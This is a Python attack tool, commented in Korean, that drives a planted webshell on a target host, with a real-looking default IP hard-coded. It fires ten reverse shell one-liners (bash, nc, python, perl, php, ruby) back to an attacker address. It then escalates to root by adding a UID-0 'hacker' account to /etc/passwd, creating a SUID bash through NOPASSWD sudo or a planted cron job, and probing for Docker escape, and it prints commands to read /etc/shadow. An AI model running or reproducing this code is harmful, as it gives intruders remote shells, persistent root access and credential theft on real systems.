#!/usr/bin/env python3
"""
리버스 쉘 연결 및 권한 상승 자동화 스크립트
- 웹쉘을 통한 리버스 쉘 연결
- 자동 권한 상승 (다양한 기법)
- 루트 권한 획득
"""

import requests
import time
import random
import sys
import base64
import subprocess
import socket
import threading
from urllib.parse import quote

class ReverseShellPrivEsc:
    def __init__(self, target_ip, webshell_url, attacker_ip, listen_port=4444):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = webshell_url
        self.attacker_ip = attacker_ip
        self.listen_port = listen_port
        self.session = requests.Session()

        # User-Agent 설정
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        })

        self.root_obtained = False

    def execute_command(self, command, param='x'):
        """
        웹쉘을 통한 명령 실행
        """
        try:
            # URL 인코딩
            encoded_cmd = quote(command)
            url = f"{self.webshell_url}?{param}={encoded_cmd}"

            response = self.session.get(url, timeout=30)

            if response.status_code == 200:
                return response.text
            else:
                print(f"[-] 명령 실행 실패: HTTP {response.status_code}")
                return None

        except Exception as e:
            print(f"[-] 명령 실행 오류: {str(e)[:100]}")
            return None

    def get_reverse_shell_payloads(self):
        """
        다양한 리버스 쉘 페이로드 생성
        """
        ip = self.attacker_ip
        port = self.listen_port

        payloads = {
            'bash_tcp': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'bash_tcp_alt': f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            'nc_e': f"nc -e /bin/bash {ip} {port}",
            'nc_c': f"nc -c /bin/bash {ip} {port}",
            'nc_pipe': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        }

        return payloads

    def start_listener(self):
        """
        로컬에서 nc 리스너 시작 (백그라운드)
        """
        print(f"\n[*] 리스너 시작: {self.attacker_ip}:{self.listen_port}")
        print(f"[!] 별도 터미널에서 실행하세요:")
        print(f"    nc -lvnp {self.listen_port}")
        print(f"    또는")
        print(f"    socat TCP-LISTEN:{self.listen_port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane\n")

        # 3초 대기
        for i in range(3, 0, -1):
            print(f"[*] {i}초 후 리버스 쉘 연결 시도...")
            time.sleep(1)

    def trigger_reverse_shell(self):
        """
        리버스 쉘 트리거
        """
        print("\n" + "="*60)
        print("리버스 쉘 연결 시도")
        print("="*60)

        payloads = self.get_reverse_shell_payloads()

        # 백그라운드로 실행 (응답 대기하지 않음)
        for name, payload in payloads.items():
            print(f"\n[*] 시도 중: {name}")
            print(f"    페이로드: {payload[:80]}...")

            try:
                # 백그라운드 실행
                bg_payload = f"({payload}) &"
                encoded = quote(bg_payload)
                url = f"{self.webshell_url}?x={encoded}"

                # 짧은 타임아웃으로 요청
                response = self.session.get(url, timeout=3)
                print(f"[+] 트리거 완료: {name}")

            except requests.exceptions.Timeout:
                print(f"[+] 타임아웃 (연결이 백그라운드에서 진행 중일 수 있음): {name}")
            except Exception as e:
                print(f"[-] 실패: {str(e)[:50]}")

            # 다음 시도 전 대기
            time.sleep(2)

        print("\n[*] 모든 페이로드 트리거 완료")
        print("[!] 리스너에서 연결 확인하세요")

    def check_current_user(self):
        """
        현재 사용자 확인
        """
        print("\n[*] 현재 사용자 확인...")

        result = self.execute_command("whoami")
        if result:
            user = result.strip()
            print(f"[+] 현재 사용자: {user}")
            return user
        return None

    def check_sudo_rights(self):
        """
        sudo 권한 확인
        """
        print("\n[*] sudo 권한 확인...")

        result = self.execute_command("sudo -l")
        if result:
            print(f"[+] sudo 권한:")
            print(result[:500])
            return result
        return None

    def find_suid_binaries(self):
        """
        SUID 바이너리 찾기
        """
        print("\n[*] SUID 바이너리 검색...")

        cmd = "find / -perm -4000 -type f 2>/dev/null"
        result = self.execute_command(cmd)

        if result:
            print(f"[+] SUID 바이너리 발견:")
            lines = result.strip().split('\n')[:20]
            for line in lines:
                print(f"    {line}")

            return result
        return None

    def check_writable_files(self):
        """
        쓰기 가능한 시스템 파일 확인
        """
        print("\n[*] 쓰기 가능한 중요 파일 확인...")

        important_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/crontab",
            "/etc/cron.d/*"
        ]

        for file_path in important_files:
            cmd = f"ls -la {file_path} 2>/dev/null"
            result = self.execute_command(cmd)
            if result and "cannot access" not in result:
                print(f"[*] {file_path}:")
                print(f"    {result.strip()[:200]}")

    def exploit_writable_passwd(self):
        """
        /etc/passwd 쓰기 가능 시 루트 사용자 추가
        """
        print("\n[*] /etc/passwd 쓰기 권한 확인...")

        # 쓰기 권한 확인
        result = self.execute_command("test -w /etc/passwd && echo 'writable' || echo 'not writable'")

        if result and 'writable' in result:
            print("[+] /etc/passwd 쓰기 가능!")

            # 루트 사용자 추가 (패스워드: hacked)
            # openssl passwd -1 -salt salt hacked => $1$salt$qv9zqXe8FrlaX2fDKz.W4.
            passwd_line = "hacker:$1$salt$qv9zqXe8FrlaX2fDKz.W4.:0:0:root:/root:/bin/bash"

            cmd = f"echo '{passwd_line}' >> /etc/passwd"
            self.execute_command(cmd)

            # 확인
            verify = self.execute_command("tail -1 /etc/passwd")
            if verify and 'hacker' in verify:
                print("[+] 루트 사용자 'hacker' 추가 성공!")
                print("[+] 패스워드: hacked")
                print("[!] SSH 접속: ssh hacker@{self.target_ip}")
                self.root_obtained = True
                return True

        else:
            print("[-] /etc/passwd 쓰기 불가")

        return False

    def exploit_sudo_no_password(self):
        """
        패스워드 없는 sudo 명령 악용
        """
        print("\n[*] sudo 권한 악용 시도...")

        sudo_info = self.execute_command("sudo -l 2>/dev/null")

        if sudo_info and "NOPASSWD" in sudo_info:
            print("[+] NOPASSWD sudo 발견!")
            print(sudo_info[:300])

            # /bin/bash 실행 가능 여부 확인
            if "/bin/bash" in sudo_info or "ALL" in sudo_info:
                print("[+] sudo bash로 루트 권한 획득 가능!")

                # SUID bash 생성
                print("[*] SUID bash 생성...")
                self.execute_command("sudo cp /bin/bash /tmp/rootbash")
                self.execute_command("sudo chmod 4755 /tmp/rootbash")

                # 확인
                verify = self.execute_command("ls -la /tmp/rootbash")
                if verify and '-rws' in verify:
                    print("[+] SUID bash 생성 성공!")
                    print("[+] 실행: /tmp/rootbash -p")
                    self.root_obtained = True
                    return True

        else:
            print("[-] 악용 가능한 sudo 권한 없음")

        return False

    def exploit_cron_writable(self):
        """
        쓰기 가능한 cron 파일 악용
        """
        print("\n[*] cron 파일 쓰기 권한 확인...")

        # /etc/cron.d/ 쓰기 권한 확인
        result = self.execute_command("test -w /etc/cron.d && echo 'writable' || echo 'not writable'")

        if result and 'writable' in result:
            print("[+] /etc/cron.d/ 쓰기 가능!")

            # SUID bash 생성 cron 작업 추가
            cron_job = "* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n"

            cmd = f"echo '{cron_job}' > /etc/cron.d/privesc"
            self.execute_command(cmd)

            print("[+] Cron 작업 추가 완료")
            print("[*] 1분 대기 중...")

            # 1분 대기
            time.sleep(65)

            # 확인
            verify = self.execute_command("ls -la /tmp/rootbash 2>/dev/null")
            if verify and '-rws' in verify:
                print("[+] SUID bash 생성 성공!")
                print("[+] 실행: /tmp/rootbash -p")
                self.root_obtained = True
                return True
            else:
                print("[-] SUID bash 생성 실패")

        else:
            print("[-] /etc/cron.d/ 쓰기 불가")

        return False

    def exploit_docker_escape(self):
        """
        Docker 컨테이너 탈출 시도
        """
        print("\n[*] Docker 컨테이너 확인...")

        # /.dockerenv 파일 존재 확인
        result = self.execute_command("test -f /.dockerenv && echo 'docker' || echo 'not docker'")

        if result and 'docker' in result:
            print("[+] Docker 컨테이너 환경 감지!")

            # Privileged 컨테이너 확인
            cap_result = self.execute_command("capsh --print 2>/dev/null | grep Current")
            if cap_result:
                print(f"[*] Capabilities: {cap_result[:200]}")

            # Docker 소켓 접근 가능 여부
            socket_result = self.execute_command("test -S /var/run/docker.sock && echo 'accessible' || echo 'not accessible'")

            if socket_result and 'accessible' in socket_result:
                print("[+] Docker 소켓 접근 가능!")
                print("[!] Docker 탈출 가능성 높음")
                # 실제 탈출 코드는 여기에 추가
                return True

        else:
            print("[-] Docker 환경 아님")

        return False

    def auto_privilege_escalation(self):
        """
        자동 권한 상승 시도
        """
        print("\n" + "="*60)
        print("자동 권한 상승 시도")
        print("="*60)

        # 1. 현재 사용자 확인
        current_user = self.check_current_user()

        if current_user and 'root' in current_user:
            print("[+] 이미 루트 권한!")
            self.root_obtained = True
            return True

        # 2. sudo 권한 확인
        self.check_sudo_rights()

        # 3. SUID 바이너리 찾기
        self.find_suid_binaries()

        # 4. 쓰기 가능한 파일 확인
        self.check_writable_files()

        # 5. 권한 상승 시도들
        print("\n[*] 권한 상승 기법 시도 중...\n")

        # 5.1. /etc/passwd 쓰기
        if self.exploit_writable_passwd():
            return True

        # 5.2. sudo NOPASSWD 악용
        if self.exploit_sudo_no_password():
            return True

        # 5.3. cron 파일 쓰기
        if self.exploit_cron_writable():
            return True

        # 5.4. Docker 탈출
        if self.exploit_docker_escape():
            return True

        print("\n[-] 자동 권한 상승 실패")
        print("[!] 수동으로 권한 상승 필요")

        return False

    def manual_privesc_guide(self):
        """
        수동 권한 상승 가이드 출력
        """
        print("\n" + "="*60)
        print("수동 권한 상승 가이드")
        print("="*60)

        print("""
1. SUID 바이너리 악용
   - find / -perm -4000 -type f 2>/dev/null
   - GTFOBins 참고: https://gtfobins.github.io/

2. Sudo 권한 악용
   - sudo -l
   - sudo 명령어로 실행 가능한 프로그램 찾기

3. Kernel Exploit
   - uname -a
   - searchsploit linux kernel [version]

4. Cron Jobs
   - cat /etc/crontab
   - ls -la /etc/cron.*

5. 쓰기 가능한 서비스 파일
   - systemctl list-units --type=service
   - find /etc/systemd -writable 2>/dev/null

6. NFS 공유
   - cat /etc/exports
   - showmount -e localhost

7. MySQL UDF
   - mysql -u root -p
   - CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

8. Capabilities
   - getcap -r / 2>/dev/null

9. Path Hijacking
   - echo $PATH
   - find / -writable -type d 2>/dev/null | grep -v proc

10. LD_PRELOAD
    - sudo -l | grep LD_PRELOAD
        """)

    def get_root_shell_commands(self):
        """
        루트 쉘 획득 명령어 출력
        """
        print("\n" + "="*60)
        print("루트 권한 명령 실행 방법")
        print("="*60)

        if self.root_obtained:
            print(f"""
[+] 루트 권한 획득 성공!

다음 명령으로 루트 쉘 실행:

1. SUID bash 사용:
   /tmp/rootbash -p

2. 웹쉘로 루트 명령 실행:
   {self.webshell_url}?x=/tmp/rootbash -p -c 'whoami'
   {self.webshell_url}?x=/tmp/rootbash -p -c 'cat /etc/shadow'
   {self.webshell_url}?x=/tmp/rootbash -p -c 'cat /root/flag.txt'

3. SSH 접속 (사용자 추가한 경우):
   ssh hacker@{self.target_ip}
   패스워드: hacked
            """)
        else:
            print("[-] 아직 루트 권한 획득 못함")
            print("[!] manual_privesc_guide() 참고")


def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   리버스 쉘 & 권한 상승 자동화 스크립트                  ║
    ║   - 리버스 쉘 연결                                        ║
    ║   - 자동 권한 상승                                        ║
    ║   - 루트 권한 획득                                        ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # 인자 파싱
    if len(sys.argv) >= 4:
        target_ip = sys.argv[1]
        webshell_url = sys.argv[2]
        attacker_ip = sys.argv[3]
        listen_port = int(sys.argv[4]) if len(sys.argv) > 4 else 4444
    else:
        target_ip = input("타겟 IP 주소 (기본: 43.201.154.142): ").strip() or "43.201.154.142"
        webshell_url = input(f"웹쉘 URL (예: http://{target_ip}/uploads/shell.php): ").strip()
        attacker_ip = input("공격자 IP 주소: ").strip()
        listen_port = int(input("리스너 포트 (기본: 4444): ").strip() or "4444")

    # 스크립트 시작
    rs = ReverseShellPrivEsc(target_ip, webshell_url, attacker_ip, listen_port)

    # 메뉴
    print("\n" + "="*60)
    print("작업 선택")
    print("="*60)
    print("1. 리버스 쉘만 트리거")
    print("2. 권한 상승만 시도")
    print("3. 리버스 쉘 + 권한 상승 (전체 자동화)")
    print("4. 수동 권한 상승 가이드 보기")
    print("="*60)

    choice = input("선택 (1-4): ").strip()

    if choice == "1":
        rs.start_listener()
        rs.trigger_reverse_shell()

    elif choice == "2":
        rs.auto_privilege_escalation()
        rs.get_root_shell_commands()

    elif choice == "3":
        # 전체 자동화
        print("\n[*] 전체 자동화 시작...")

        # 리버스 쉘
        rs.start_listener()
        rs.trigger_reverse_shell()

        print("\n[*] 리버스 쉘 연결 대기 중... (10초)")
        time.sleep(10)

        # 권한 상승
        rs.auto_privilege_escalation()
        rs.get_root_shell_commands()

    elif choice == "4":
        rs.manual_privesc_guide()

    else:
        print("[-] 잘못된 선택")


if __name__ == "__main__":
    main()
